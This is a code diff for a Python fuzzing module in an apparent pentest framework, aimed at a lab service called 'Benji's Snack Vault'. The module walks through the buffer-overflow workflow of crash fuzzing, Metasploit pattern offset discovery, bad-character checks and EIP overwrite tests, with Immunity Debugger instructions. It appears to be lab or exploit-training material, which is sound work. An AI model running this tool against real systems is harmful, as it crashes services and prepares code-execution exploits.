@@ -1,7 +1,5 @@
 # modules/buffer_overflow/benjis_snack_vault_fuzz.py
-
 import socket
-import argparse
 import time
 import sys
 import subprocess
@@ -17,29 +15,27 @@ class BenjisSnackVaultFuzz(BaseModule):
         self.options = {
             "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
             "RPORT": {"value": 9999, "required": True, "description": "Target port"},
-            "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix"},
-            "MODE": {
-                "value": "fuzz",
-                "required": True,
-                "description": "Mode: fuzz | pattern | badchars | test_offset"
-            },
-            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Length for pattern mode"},
-            "OFFSET": {"value": 0, "required": False, "description": "Offset for badchars/test mode (set after pattern)"},
-            "CRLF": {"value": True, "required": False, "description": "Append \\r\\n (yes/no)"}
+            "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix (e.g., MEOW )"},
+            "MODE": {"value": "fuzz", "required": True, "description": "Mode: fuzz | pattern | badchars | test_offset"},
+            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Pattern length for 'pattern' mode"},
+            "OFFSET": {"value": 0, "required": False, "description": "Offset to EIP (set after pattern mode)"},
+            "CRLF": {"value": True, "required": False, "description": "Append \\r\\n to payloads (yes/no)"}
         }
 
     def show_help(self):
         print(colored("\nBenji's Snack Vault Fuzzer Help:", "yellow"))
-        print("Modes:")
-        print("  fuzz          - Incremental A's to find crash point")
-        print("  pattern       - Send Metasploit pattern for offset discovery")
-        print("  badchars      - Send byte range to find bad characters")
-        print("  test_offset   - Test EIP control with BBBB at offset")
-        print("\nExample workflow:")
+        print("Available modes:")
+        print("  fuzz          - Send increasing A's to find crash point")
+        print("  pattern       - Send unique Metasploit pattern for offset discovery")
+        print("  badchars      - Send 01-ff byte range after offset to identify bad chars")
+        print("  test_offset   - Test EIP overwrite with BBBB at set offset")
+        print("\nWorkflow example:")
         print("  set MODE fuzz")
         print("  run")
-        print("  → note crash size → set MODE pattern → run → get EIP → calculate offset")
-        print("  → set OFFSET <number> → set MODE badchars → run → inspect dump")
+        print("  → Note crash size → set MODE pattern → run → note EIP")
+        print("  → Run 'pattern_offset.rb -q <EIP> -l <length>' → set OFFSET <result>")
+        print("  → set MODE badchars → run → inspect stack dump in Immunity")
+        print("  → set MODE test_offset → run → confirm EIP = 42424242\n")
 
     def run(self):
         opts = {k: v["value"] for k, v in self.options.items()}
@@ -47,7 +43,7 @@ class BenjisSnackVaultFuzz(BaseModule):
         rport = int(opts["RPORT"])
         prefix = opts["PREFIX"]
         mode = opts["MODE"].lower()
-        crlf = opts["CRLF"]
+        crlf = opts["CRLF"]  # bool
 
         if mode == "fuzz":
             self._run_fuzz(rhost, rport, prefix, crlf)
@@ -65,6 +61,7 @@ class BenjisSnackVaultFuzz(BaseModule):
             self._test_offset(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
         else:
             print(colored(f"[-] Unknown mode: {mode}", "red"))
+            print(colored("Valid modes: fuzz, pattern, badchars, test_offset", "yellow"))
 
     def _send_payload(self, rhost, rport, payload):
         try:
@@ -79,13 +76,13 @@ class BenjisSnackVaultFuzz(BaseModule):
             return False
 
     def _run_fuzz(self, rhost, rport, prefix, crlf):
-        print(colored("[*] Fuzzing mode - sending increasing A's", "yellow"))
+        print(colored("[*] Fuzz mode - sending increasing A's", "yellow"))
         for size in range(100, 6000, 200):
             junk = b"A" * size
             payload = prefix.encode() + junk
             if crlf:
                 payload += b"\r\n"
-            print(f"  [+] Sending {len(payload)} bytes...", end="")
+            print(f"  [+] Sending {len(payload)} bytes...", end="", flush=True)
             if self._send_payload(rhost, rport, payload):
                 print(" OK")
             else:
@@ -95,7 +92,7 @@ class BenjisSnackVaultFuzz(BaseModule):
             time.sleep(0.2)
 
     def _run_pattern(self, rhost, rport, prefix, length, crlf):
-        print(colored(f"[*] Pattern mode - generating and sending {length}-byte pattern", "yellow"))
+        print(colored(f"[*] Pattern mode - generating {length}-byte pattern", "yellow"))
         try:
             pattern = subprocess.check_output(
                 f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {length}",
@@ -110,10 +107,10 @@ class BenjisSnackVaultFuzz(BaseModule):
             payload += b"\r\n"
 
         if self._send_payload(rhost, rport, payload):
-            print(colored("[+] Pattern sent. Crash Immunity → note EIP value", "green"))
-            print(colored("    Then run: pattern_offset.rb -q <EIP_VALUE> -l <length>", "yellow"))
+            print(colored("[+] Pattern sent. Crash in Immunity → note EIP value", "green"))
+            print(colored(f"    Then run: pattern_offset.rb -q <EIP> -l {length}", "yellow"))
         else:
-            print(colored("[!] Send failed - check target", "red"))
+            print(colored("[!] Send failed", "red"))
 
     def _run_badchars(self, rhost, rport, prefix, offset, crlf):
         print(colored("[*] Badchars mode - sending 01-ff after offset", "yellow"))
@@ -127,7 +124,7 @@ class BenjisSnackVaultFuzz(BaseModule):
         if self._send_payload(rhost, rport, payload):
             print(colored("[+] Badchars sent. In Immunity:", "green"))
             print("    1. Crash → right-click ESP → Follow in Dump")
-            print("    2. Look for mangled/missing bytes after BBBB")
+            print("    2. Look for mangled/missing/replaced bytes after BBBB")
         else:
             print(colored("[!] Send failed", "red"))
 
@@ -149,5 +146,8 @@ class BenjisSnackVaultFuzz(BaseModule):
         cmd_lower = cmd.strip().lower()
         if cmd_lower == "run":
             self.run()
+            return
+        if cmd_lower == "help":
+            self.show_help()
             return
         super().handle_command(cmd)
